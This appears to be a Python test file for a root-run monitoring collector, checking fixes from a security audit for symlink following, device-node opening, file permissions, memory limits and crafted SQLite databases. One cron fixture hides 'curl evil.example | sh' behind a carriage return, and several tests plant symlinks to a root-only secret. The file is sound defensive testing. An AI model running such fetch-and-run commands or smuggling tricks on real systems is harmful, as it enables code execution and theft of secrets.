"""The root collector reads files in folders other parties can write to (a backup container's log folder, the
Authelia database folder, a user's ~/.ssh). Found in the pre-release audit (2026-10-30): root opened whatever was
there before checking its type (opening a device node runs its driver: /dev/watchdog resets the host), followed
symlinks in paths from collector.toml (showing root-only files on the card), and briefly wrote the unredacted crontab
snapshot readable by everyone."""
import os
import stat
import subprocess
import sys
import tempfile
import unittest

from test_collector_requests import load_collector


class Files(unittest.TestCase):
    def setUp(self):
        self.col, self.tmp = load_collector()
        self.opened = []
        real = self.col.os.open

        def spy(path, flags, *a, **k):
            if not flags & getattr(os, "O_PATH", 0):
                self.opened.append(path if isinstance(path, str) else repr(path))
            return real(path, flags, *a, **k)
        self.col.os.open = spy
        self.addCleanup(lambda: setattr(self.col.os, "open", real))

    def test_a_device_or_fifo_is_never_opened_for_reading(self):
        fifo = os.path.join(self.tmp, "db.sqlite3")
        os.mkfifo(fifo)
        for path in (fifo, "/dev/null"):
            self.opened.clear()
            with self.assertRaises(self.col.CheckFailed):
                self.col.read_regular(path, 1 << 20)
            self.assertEqual(self.col.tail_lines(path), [])
            self.assertEqual([p for p in self.opened if path in p or p.startswith("/proc/self/fd/")], [],
                             f"{path} was opened for reading before its type was checked")

    def test_a_link_in_a_folder_others_can_write_is_not_followed(self):
        secret = os.path.join(self.tmp, "root-only.conf")
        with open(secret, "w") as f:
            f.write("password = hunter2\n")
        logs = tempfile.mkdtemp(dir=self.tmp)          # (a folder a backup container writes: not root's alone)
        os.symlink(secret, os.path.join(logs, "backup.log"))
        self.assertEqual(self.col.tail_lines(os.path.join(logs, "backup.log")), [])
        with self.assertRaises(self.col.CheckFailed):
            self.col.read_regular(os.path.join(logs, "backup.log"), 1 << 20)

    def test_links_in_root_only_folders_are_followed(self):
        # (/var/run -> /run, /bin -> usr/bin, Fedora Atomic's /home -> /var/home: links only root could have made)
        target = os.path.realpath("/bin/sh")
        if os.path.realpath("/bin") == "/bin" or os.stat("/").st_uid != 0:
            self.skipTest("no root-owned link on the way here")
        self.assertIsNotNone(self.col.regular_stat("/bin/" + os.path.basename(target)))

    def test_backup_files_skip_links(self):
        dumps = os.path.join(self.tmp, "dumps")
        os.makedirs(dumps)
        with open(os.path.join(dumps, "a.sql.gz"), "wb") as f:
            f.write(b"x" * 10)
        big = os.path.join(self.tmp, "big-root-only")
        with open(big, "wb") as f:
            f.truncate(5 << 20)
        os.symlink(big, os.path.join(dumps, "b.sql.gz"))
        os.utime(big, (2_000_000_000, 2_000_000_000))
        self.col.BAK.clear()
        self.col.BAK.update({"artifacts": [{"label": "dumps", "glob": dumps + "/*.sql.gz"}]})
        art = self.col.backups()["artifacts"][0]
        self.assertEqual((art["count"], art["size"]), (1, 10), "a link's target (its size, its date) isn't a backup file")

    def test_files_are_private_while_written(self):
        # (the crontab snapshot holds every cron line unredacted: the dash's uid could catch it with inotify)
        modes, real = [], self.col.json.dump

        def spy(obj, f, *a, **k):
            modes.append(os.fstat(f.fileno()).st_mode & 0o777)
            return real(obj, f, *a, **k)
        self.col.json.dump = spy
        self.addCleanup(lambda: setattr(self.col.json, "dump", real))
        old = os.umask(0o022)
        self.addCleanup(lambda: os.umask(old))
        os.makedirs(self.col.OUT_DIR, exist_ok=True)
        self.col.save_approved(["* * * * * root backup --password=x"])
        self.col.write_output({"x": 1}, os.path.join(self.col.OUT_DIR, "hw.json"))
        self.assertEqual(modes, [0o600, 0o600], "nobody else can read them before they're finished")
        self.assertEqual(stat.S_IMODE(os.stat(self.col.CRON_APPROVED).st_mode), 0o600)
        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(self.col.OUT_DIR, "hw.json")).st_mode), 0o640)

    def test_a_link_in_a_root_owned_container_folder_is_not_followed(self):
        # Docker creates bind-mount folders root:root 0755, and a root container writes them: "owned by root, nobody
        # else can write" isn't "only the system": links are followed in system folders only (audit round 2)
        secret = os.path.join(self.tmp, "root-only.conf")
        with open(secret, "w") as f:
            f.write("password = hunter2\n")
        logs = tempfile.mkdtemp(dir=self.tmp)
        os.symlink(secret, os.path.join(logs, "backup.log"))
        real = self.col._root_only
        self.col._root_only = lambda fd: True          # (as if root owned the container's folder)
        try:
            self.assertEqual(self.col.tail_lines(os.path.join(logs, "backup.log")), [])
        finally:
            self.col._root_only = real

    def test_a_carriage_return_cant_hide_a_cron_line(self):
        # cron splits on \n only; Python's universal newlines also split on \r, so "approved line\r#; payload" read
        # as the approved line plus a comment, while cron runs the payload (audit round 2)
        tab = os.path.join(self.tmp, "crontab")
        with open(tab, "wb") as f:
            f.write(b"17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
        self.col.CRON_GLOBS = (tab,)
        before = self.col.cron_files()
        with open(tab, "wb") as f:
            f.write(b"17 * * * * root cd / && run-parts --report /etc/cron.hourly\r#; curl evil.example | sh\n")
        self.assertNotEqual(self.col.cron_files(), before, "the changed line must show as changed")
        self.assertEqual(self.col.card_lines([f"line {i}" for i in range(25)])[-1], "… and 5 more lines", "nothing approved unseen")

    def test_a_tail_reads_a_bounded_amount(self):
        # (it read from max_bytes before the end to wherever the end was by then: a log that keeps growing was read until
        # the collector was killed; and 4 MB of one-character lines made ~4 million lines; audit round 3)
        log = os.path.join(self.tmp, "growing.log")
        with open(log, "w") as f:
            f.write("x\n" * 2_000_000)
        lines = self.col.tail_lines(log, 4_000_000)
        self.assertLessEqual(len(lines), self.col.TAIL_LINES_MAX)
        self.assertGreater(len(lines), 1000)

    def test_a_tail_never_holds_more_than_it_keeps(self):
        # (it split the whole tail at once: 4 MB of "\xff\n" made 2 million separate strings, +150 MB of the 200M cap;
        # audit round 4)
        import tracemalloc
        log = os.path.join(self.tmp, "ff.log")
        with open(log, "wb") as f:
            f.write(b"\xff\n" * 1_000_000)
        tracemalloc.start()
        try:
            lines = self.col.tail_lines(log, 4_000_000)
            peak = tracemalloc.get_traced_memory()[1]
        finally:
            tracemalloc.stop()
        self.assertLess(peak, 40_000_000, "the 50,000 kept lines and the text, not a string per line read")
        self.assertEqual(len(lines), self.col.TAIL_LINES_MAX)
        text = "first\na\r\nb\rc\x0bd\x85e\u2028f\n\nlast"
        with open(log, "w", encoding="utf-8", newline="") as f:
            f.write(text)
        self.assertEqual(self.col.tail_lines(log), text.splitlines(), "lines split as before")
        self.assertEqual(self.col.tail_lines(log, len(text.encode()) - 2), text.splitlines()[1:], "a cut first line dropped")

    def test_a_long_line_is_redacted_quickly(self):
        import time
        t = time.monotonic()
        out = self.col.redact("x " + "-p" * 200_000)
        self.assertLess(time.monotonic() - t, 1, "a 400 KB line took minutes (quadratic regexes)")
        self.assertIn("characters", out, "a cut line says so")
        lines = os.path.join(self.tmp, "big.log")
        with open(lines, "w") as f:
            f.write("a" * 3_000_000 + "\nend\n")
        self.assertTrue(all(len(l) <= 8192 for l in self.col.tail_lines(lines, 4_000_000)))

    def authelia_db(self, create):
        import sqlite3
        path = os.path.join(self.tmp, "db.sqlite3")
        if os.path.exists(path):
            os.remove(path)
        con = sqlite3.connect(path)
        con.executescript(create)
        con.commit()
        con.close()
        self.col.SEC["authelia_db"] = path

    def test_authelia_tables_must_be_plain_tables(self):
        # Virtual tables (FTS, R-tree) pass "type = table" but run their module's C code on the file's bytes; generated
        # columns run expressions from the file. Either let a crafted database hold root's query far past its limit.
        for create in ("CREATE VIRTUAL TABLE authentication_logs USING fts5(time, successful, banned, username, auth_type, "
                       "remote_ip, request_uri, id);",
                       "CREATE TABLE authentication_logs (id INTEGER PRIMARY KEY, time TEXT, successful INT, banned INT, "
                       "username TEXT, auth_type TEXT, remote_ip TEXT, request_uri TEXT GENERATED ALWAYS AS (hex(username)));"):
            self.authelia_db(create)
            with self.assertRaises(self.col.CheckFailed, msg=create[:30]):
                self.col.authelia_detail()
        self.authelia_db("CREATE TABLE authentication_logs (id INTEGER PRIMARY KEY, time TEXT, successful INT, banned INT, "
                         "username TEXT, auth_type TEXT, remote_ip TEXT, request_uri TEXT);")
        self.assertIsNotNone(self.col.authelia_detail(), "a plain table still works")

class AutheliaLog(unittest.TestCase):
    """Anyone on the internet can fill Authelia's log with failed sign-ins (long user names too). Reading the last 24 h
    of it whole got the collector OOM-killed (200 MB cap) at ~55 MB of log, every minute again (audit 2026-10-30)."""

    def test_a_huge_log_is_streamed(self):
        tmp = tempfile.mkdtemp(prefix="hd-authelia-")
        stub = os.path.join(tmp, "docker")
        with open(stub, "w") as f:
            f.write(f"#!{sys.executable} -I\n"
                    "import sys\n"
                    "line = 'time=\"2026-10-30T09:%02d:00Z\" level=error msg=\"Unsuccessful 1FA authentication attempt by user ' "
                    "+ chr(39) + 'x' * 1500 + chr(39) + '\" remote_ip=203.0.113.9\\n'\n"
                    "for i in range(120_000):\n"
                    "    sys.stdout.write(line % (i % 60))\n"
                    "sys.stdout.flush()\n"
                    "sys.stderr.write('time=\"2026-10-30T10:00:00Z\" msg=\"Unsuccessful 2FA authentication attempt by user '"
                    " + chr(39) + 'newest' + chr(39) + '\" remote_ip=203.0.113.7\\n')\n")
        os.chmod(stub, 0o755)
        code = ("import os, resource, sys; sys.path.insert(0, %r); from test_collector_requests import load_collector; "
                "col, _ = load_collector(); before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss; "
                "n, recent = col.authelia_failures('authelia'); "
                "print(n, recent[0]['user'], len(recent), (resource.getrusage(resource.RUSAGE_SELF).ru_maxrss - before) >> 10)"
                % os.path.dirname(os.path.abspath(__file__)))
        out = subprocess.run([sys.executable, "-I", "-c", code], capture_output=True, text=True, timeout=120,
                             env={**os.environ, "PATH": tmp + os.pathsep + os.environ.get("PATH", "")})
        self.assertEqual(out.returncode, 0, out.stderr[-500:])
        n, newest, kept, grew_mb = out.stdout.split()
        self.assertEqual((int(n), newest, int(kept)), (120_001, "newest", 6), "every failure counted, the newest first")
        self.assertLess(int(grew_mb), 50, "~190 MB of log, read without holding it")

class OddOutput(unittest.TestCase):
    """One failing mount (a NAS share gone: EIO) or odd smartctl / nvidia-smi output ended the collector's main loop
    before it wrote hw.json, again after every restart (audit 2026-10-30)."""

    def setUp(self):
        self.col, _ = load_collector()

    def test_a_mount_that_fails_is_shown_missing(self):
        def broken(path):
            raise OSError(5, "Input/output error")
        real = self.col.os.statvfs
        self.col.os.statvfs = broken
        try:
            disks = self.col.disks()
        finally:
            self.col.os.statvfs = real
        self.assertTrue(all(d.get("missing") for d in disks))

    def test_odd_smart_and_gpu_output(self):
        real = self.col.run
        self.col.run = lambda *a, **k: '{"ata_smart_attributes": {"table": [{"id": 194, "raw": "x"}]}, "temperature": []}'
        try:
            self.assertIn("error", self.col.smart("/dev/sdz"))
            self.col.run = lambda *a, **k: "Tesla, 40\n"
            self.assertIsNone(self.col.gpu() if self.col.have("nvidia-smi") else None)
        finally:
            self.col.run = real

class Robust(unittest.TestCase):
    """Odd inputs that stopped one part of the collector for good (audit, the fuzzer and round 2)."""

    def setUp(self):
        self.col, self.tmp = load_collector()

    def test_a_mount_path_that_isnt_utf8(self):
        # a user's FUSE mount at a folder named with byte 0xff: detection failed every time, and the settings page's
        # collector changes were never taken again
        info = os.path.join(self.tmp, "mountinfo")
        with open(info, "wb") as f:
            f.write(b"22 1 8:1 / / rw,relatime - ext4 /dev/sda1 rw\n"
                    b"40 22 0:50 / /home/mallory/\xff rw - fuse.sshfs host: rw\n")
        self.assertIsInstance(self.col.real_mounts_from(info, {}), list)

    def test_an_authelia_row_that_isnt_text(self):
        import sqlite3
        path = os.path.join(self.tmp, "db.sqlite3")
        con = sqlite3.connect(path)
        con.executescript("CREATE TABLE authentication_logs (id INTEGER PRIMARY KEY, time TEXT, successful INT, banned INT, "
                          "username TEXT, auth_type TEXT, remote_ip TEXT, request_uri TEXT);")
        con.execute("INSERT INTO authentication_logs VALUES (1, '2026-10-30 10:00:00', 0, 0, CAST(X'FFFE6E6F74' AS TEXT), "
                    "'1FA', '203.0.113.9', '/')")
        con.commit()
        con.close()
        self.col.SEC["authelia_db"] = path
        self.assertIsNotNone(self.col.authelia_detail(), "one odd row doesn't blank the whole view")

    def test_backup_globs_are_capped_and_skip_links(self):
        dumps = os.path.join(self.tmp, "dumps")
        os.makedirs(dumps)
        for i in range(30):
            open(os.path.join(dumps, f"{i:03d}.gz"), "w").close()
        secret = os.path.join(self.tmp, "root-only")
        open(secret, "w").write("x" * 99)
        os.symlink(self.tmp, os.path.join(dumps, "linked"))          # a folder link inside a writable folder
        real = self.col.GLOB_MAX
        self.col.GLOB_MAX = 10
        try:
            self.assertEqual(len(self.col.capped_glob(dumps + "/*.gz")), 10)
            self.assertNotIn("root-only", " ".join(f for f, *_ in self.col.backup_job_files([dumps + "/linked/*"])))
        finally:
            self.col.GLOB_MAX = real

    def test_a_backup_glob_looks_at_a_bounded_number_of_names(self):
        # (glob listed a whole folder before matching, and followed folder links as it went: a container's folder of
        # 700,000 names got the collector killed at its memory cap, 10,000 links to "." took 24 s; audit round 4)
        import time
        flood = os.path.join(self.tmp, "flood")
        os.makedirs(flood)
        for i in range(3000):
            open(os.path.join(flood, f"x{i:05d}"), "w").close()
        for i in range(300):
            os.symlink(".", os.path.join(flood, f"loop{i:03d}"))
        real = self.col.GLOB_LOOK
        self.col.GLOB_LOOK = 1000
        listed = []
        scandir = self.col.os.scandir

        def counting(p):
            it = scandir(p)
            listed.append(p)
            return it
        self.col.os.scandir = counting
        try:
            t0 = time.monotonic()
            self.assertEqual(self.col.capped_glob(flood + "/*/*.gz"), [])
            self.assertLess(time.monotonic() - t0, 1)
            self.assertEqual(listed, [flood], "folder links aren't entered")
        finally:
            self.col.os.scandir, self.col.GLOB_LOOK = scandir, real
        self.assertEqual(sorted(self.col.capped_glob(flood + "/x0000*")), [os.path.join(flood, f"x0000{i}") for i in range(10)])

    def test_a_state_folder_others_can_write_is_refused(self):
        open_dir = tempfile.mkdtemp(dir=self.tmp)
        os.chmod(open_dir, 0o777)
        self.assertTrue(self.col.unsafe_out_dir(open_dir))

    def test_process_names_with_capitals_match(self):
        real = self.col.run
        self.col.run = lambda cmd, *a, **k: ("123 99.0 XMRig /opt/XMRig --donate-level 1\n" if cmd[0] == "ps" else "")
        self.col.SEC.update(process_watch=True, bad_process_names=["XMRig"], cron_watch=False, firewall=False)
        try:
            self.assertEqual(self.col.security()["procs"]["found"], ["XMRig"])
        finally:
            self.col.run = real

    def test_smart_json_that_isnt_an_object(self):
        real = self.col.run
        self.col.run = lambda *a, **k: "[1, 2, 3]"
        try:
            self.assertIn("error", self.col.smart("/dev/sdz"))
        finally:
            self.col.run = real


class Flags(unittest.TestCase):
    """The immutable-file check ran lsattr, which opens whatever is at the path after its own type check: a root
    container could swap a device node in between (/dev/watchdog resets the host; audit round 3). The flags are read
    through the safe walk now, from a regular file or a folder only."""

    def setUp(self):
        self.col, self.tmp = load_collector()
        self.opened, real = [], self.col.os.open

        def spy(path, flags, *a, **k):
            if not flags & getattr(os, "O_PATH", 0):
                self.opened.append(path if isinstance(path, str) else repr(path))
            return real(path, flags, *a, **k)
        self.col.os.open = spy
        self.addCleanup(lambda: setattr(self.col.os, "open", real))

    def test_flags_of_a_file_and_a_folder(self):
        f = os.path.join(self.tmp, "x.conf")
        open(f, "w").close()
        for path in (f, self.tmp):
            self.assertIsInstance(self.col.file_flags(path), str)

    def test_a_device_or_fifo_is_never_opened(self):
        fifo = os.path.join(self.tmp, "fifo")
        os.mkfifo(fifo)
        for path in (fifo, "/dev/null"):
            self.opened.clear()
            self.assertIsNone(self.col.file_flags(path))
            self.assertEqual([p for p in self.opened if path in p or p.startswith("/proc/self/fd/")], [])

    def test_no_lsattr_is_run(self):
        ran, real = [], self.col.subprocess.run
        self.col.subprocess.run = lambda cmd, *a, **k: (ran.append(cmd), real(cmd, *a, **k))[1]
        self.addCleanup(lambda: setattr(self.col.subprocess, "run", real))
        f = os.path.join(self.tmp, "x.conf")
        open(f, "w").close()
        self.col.SEC["immutable_files"] = [f]
        self.col.locks_detail()
        self.col.security()
        self.assertFalse([c for c in ran if c and c[0] == "lsattr"])


if __name__ == "__main__":
    unittest.main()
